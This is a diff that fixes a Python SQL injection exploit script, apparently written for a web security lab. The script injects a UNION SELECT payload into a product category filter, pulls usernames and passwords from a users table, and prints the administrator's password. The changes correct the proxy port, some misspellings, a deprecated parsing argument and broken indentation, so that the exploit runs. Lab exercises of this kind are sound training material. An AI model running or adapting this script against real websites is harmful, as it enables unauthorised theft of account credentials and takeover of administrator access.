@@ -4,10 +4,10 @@ import urllib3
 from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'https': 'http://127.0.0.1', 'http': 'http://127.0.0.1'}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_sqli_users_table(url):
-    username = 'adminstrator'
+    username = 'administrator'
     path = '/filter?category=Gifts'
     sql_payload =  "' UNION select username, password from users--"
     r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
@@ -15,19 +15,19 @@ def exploit_sqli_users_table(url):
     if "administrator" in res:
         print("[+] Found the administrator password")
         soup = BeautifulSoup(r.text, 'html.parser')
-        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
-        print("[+] The adminstrator passowrd is '%s'" % admin_password)
+        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
+        print("[+] The administrator passowrd is '%s'" % admin_password)
         return True
     return False
 
 if __name__ == "__main__":
     try:
-        url = sys.argv[1].strip()
+        url = sys.argv[1].strip() # Get URL from command line argument
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
 
-        print("[+] Dumping the usernames and passwords")
-        if not exploit_sqli_users_table(url):
-            print("[-] Did not find administrator password")
+    print("[+] Dumping the usernames and passwords")
+    if not exploit_sqli_users_table(url):
+        print("[-] Did not find administrator password")
